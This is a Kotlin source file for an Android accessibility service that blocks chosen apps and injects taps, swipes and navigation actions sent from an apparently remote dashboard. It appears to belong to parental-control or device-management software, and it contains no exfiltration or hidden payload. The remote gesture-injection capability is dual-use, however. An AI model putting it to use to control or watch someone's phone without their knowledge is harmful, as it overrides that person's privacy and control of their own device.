package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import android.content.pm.PackageManager

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) ||
                svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) { false }
        }

        // ── Remote Touch Helpers (dipanggil dari DeviceService) ──────────────────

        /**
         * Inject tap pada koordinat layar fisik (x, y) dalam piksel.
         * Koordinat dikirim dari dashboard sebagai rasio [0.0–1.0] lalu
         * DeviceService mengubahnya ke piksel sebelum memanggil fungsi ini.
         */
        fun injectTap(x: Float, y: Float) {
            val svc = instance ?: return
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
            val path = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0, 50)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, null, null)
        }

        /**
         * Inject long press pada koordinat layar fisik (x, y).
         */
        fun injectLongPress(x: Float, y: Float) {
            val svc = instance ?: return
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
            val path = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0, 800)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, null, null)
        }

        /**
         * Inject swipe/drag dari (x1,y1) ke (x2,y2) dalam piksel, durasi ms.
         */
        fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300) {
            val svc = instance ?: return
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
            val path = Path().apply {
                moveTo(x1, y1)
                lineTo(x2, y2)
            }
            val stroke = GestureDescription.StrokeDescription(path, 0, duration)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, null, null)
        }

        fun pressBack()    { instance?.performGlobalAction(GLOBAL_ACTION_BACK) }
        fun pressHome()    { instance?.performGlobalAction(GLOBAL_ACTION_HOME) }
        fun pressRecents() { instance?.performGlobalAction(GLOBAL_ACTION_RECENTS) }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                // ── App Blocker Commands ──────────────────────────────────────
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                    android.util.Log.d("AppBlocker", "Blocked: $pkg")
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                    android.util.Log.d("AppBlocker", "Unblocked: $pkg")
                }
                "com.sync.xxx.UNBLOCK_ALL" -> {
                    blockedPackages.clear()
                    android.util.Log.d("AppBlocker", "All unblocked")
                }

                // ── Remote Touch Commands ─────────────────────────────────────
                "com.sync.xxx.REMOTE_TAP" -> {
                    val x = intent.getFloatExtra("x", -1f)
                    val y = intent.getFloatExtra("y", -1f)
                    if (x >= 0 && y >= 0) injectTap(x, y)
                }
                "com.sync.xxx.REMOTE_LONG_PRESS" -> {
                    val x = intent.getFloatExtra("x", -1f)
                    val y = intent.getFloatExtra("y", -1f)
                    if (x >= 0 && y >= 0) injectLongPress(x, y)
                }
                "com.sync.xxx.REMOTE_SWIPE" -> {
                    val x1  = intent.getFloatExtra("x1", -1f)
                    val y1  = intent.getFloatExtra("y1", -1f)
                    val x2  = intent.getFloatExtra("x2", -1f)
                    val y2  = intent.getFloatExtra("y2", -1f)
                    val dur = intent.getLongExtra("duration", 300L)
                    if (x1 >= 0 && y1 >= 0 && x2 >= 0 && y2 >= 0)
                        injectSwipe(x1, y1, x2, y2, dur)
                }
                "com.sync.xxx.REMOTE_BACK"    -> pressBack()
                "com.sync.xxx.REMOTE_HOME"    -> pressHome()
                "com.sync.xxx.REMOTE_RECENTS" -> pressRecents()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }

        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
            addAction("com.sync.xxx.REMOTE_TAP")
            addAction("com.sync.xxx.REMOTE_LONG_PRESS")
            addAction("com.sync.xxx.REMOTE_SWIPE")
            addAction("com.sync.xxx.REMOTE_BACK")
            addAction("com.sync.xxx.REMOTE_HOME")
            addAction("com.sync.xxx.REMOTE_RECENTS")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        android.util.Log.d("AppBlocker", "Service connected — remote touch READY")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        if (pkg == "android") return
        if (pkg == "com.android.systemui") return

        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime  = now

        performGlobalAction(GLOBAL_ACTION_HOME)
        mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)

        val appName = try {
            val pm = packageManager
            pm.getApplicationLabel(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
                else
                    @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (e: Exception) { pkg }

        mainHandler.postDelayed({
            Toast.makeText(this, "🚫 $appName diblokir", Toast.LENGTH_SHORT).show()
        }, 50)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
